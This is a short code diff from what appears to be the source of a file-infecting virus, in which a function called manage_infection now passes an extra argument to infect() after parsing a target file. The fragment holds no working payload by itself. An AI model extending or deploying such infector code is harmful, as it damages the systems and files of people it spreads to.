@@ -28,7 +28,7 @@ void manage_infection(char *path, char *file_name, t_file *file, t_arg_data *dat
 {
     init_file(file, file_name);
     if (parse_file(path, file_name, file, data))
-        infect(file);
+        infect(file, data);
 
     if (file->fd > 0)
         close(file->fd);
